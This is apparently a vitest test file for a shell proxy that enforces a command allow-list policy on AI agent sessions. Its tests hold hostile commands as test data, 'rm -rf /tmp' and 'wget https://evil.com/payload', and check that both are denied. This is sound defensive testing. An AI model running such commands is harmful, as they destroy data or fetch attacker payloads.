import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { AgentGateway } from '../../src/engine/runtime.js';
import { ShellProxy } from '../../src/proxy/shell-proxy.js';

let tmpDir: string;
let ledgerDir: string;

const POLICY_YAML = `
version: "1.0"
name: "shell-proxy-test"
capabilities:
  - tool: "command:run"
    scope:
      binaries: ["echo", "ls", "cat"]
limits:
  max_runtime_ms: 60000
gates: []
evidence:
  require: []
  format: "jsonl"
forbidden:
  - pattern: "rm -rf"
`;

beforeEach(() => {
  tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'shell-proxy-test-'));
  ledgerDir = path.join(tmpDir, 'ledgers');
});

afterEach(() => {
  fs.rmSync(tmpDir, { recursive: true, force: true });
});

describe('ShellProxy', () => {
  it('should allow and execute an allowed command', async () => {
    const gateway = await AgentGateway.create({ ledgerDir });
    const session = await gateway.createSession(POLICY_YAML);
    const shell = new ShellProxy(gateway, session.id);

    const result = await shell.exec('echo "hello world"');
    expect(result.allowed).toBe(true);
    expect(result.exitCode).toBe(0);
    expect(result.stdout).toContain('hello world');
  });

  it('should deny a forbidden command', async () => {
    const gateway = await AgentGateway.create({ ledgerDir });
    const session = await gateway.createSession(POLICY_YAML);
    const shell = new ShellProxy(gateway, session.id);

    const result = await shell.exec('rm -rf /tmp');
    expect(result.allowed).toBe(false);
    expect(result.denied).toBeDefined();
    expect(result.denied!.reasons.length).toBeGreaterThan(0);
  });

  it('should deny a command with disallowed binary', async () => {
    const gateway = await AgentGateway.create({ ledgerDir });
    const session = await gateway.createSession(POLICY_YAML);
    const shell = new ShellProxy(gateway, session.id);

    const result = await shell.exec('wget https://evil.com/payload');
    expect(result.allowed).toBe(false);
  });

  it('should record result after execution', async () => {
    const gateway = await AgentGateway.create({ ledgerDir });
    const session = await gateway.createSession(POLICY_YAML);
    const shell = new ShellProxy(gateway, session.id);

    await shell.exec('echo "test"');

    const updated = gateway.getSession(session.id)!;
    expect(updated.actions).toHaveLength(1);
    expect(updated.actions[0].result).toBeDefined();
    expect(updated.actions[0].result!.success).toBe(true);
  });

  it('should return the correct session ID', async () => {
    const gateway = await AgentGateway.create({ ledgerDir });
    const session = await gateway.createSession(POLICY_YAML);
    const shell = new ShellProxy(gateway, session.id);

    expect(shell.getSessionId()).toBe(session.id);
  });
});
